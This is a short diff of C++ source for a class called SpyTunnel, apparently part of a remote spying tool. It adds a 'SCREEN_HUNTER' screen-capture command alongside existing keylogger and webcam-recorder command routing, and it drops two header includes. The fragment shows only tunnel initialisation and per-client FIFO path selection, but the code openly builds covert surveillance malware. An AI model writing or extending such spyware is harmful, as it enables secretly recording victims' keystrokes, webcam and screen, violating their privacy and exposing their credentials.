@@ -1,6 +1,4 @@
 #include "spy_tunnel.hpp"
-#include "keylogger.hpp"
-#include "webcam_recorder.hpp"
 
 int SpyTunnel::init(const std::string& __ip, uint __port, int*& __p_tunnel_shutdown_fd, int __connection_type) {    
     memset(&tunnel_addr_, 0, sizeof(tunnel_addr_));
@@ -220,6 +218,8 @@ void SpyTunnel::edit_fifo_path(int __client_index, CommandCode __command_code) {
         fifo_path_ = KEYLOGGER_FIFO_PATH + std::to_string(__client_index);
     } else if (__command_code == WEBCAM_RECORDER) {
         fifo_path_ = WEBCAM_RECORDER_FIFO_PATH + std::to_string(__client_index);
+    } else if (__command_code == SCREEN_HUNTER) {
+        fifo_path_ = SCREEN_HUNTER_FIFO_PATH + std::to_string(__client_index);
     }
 }
 
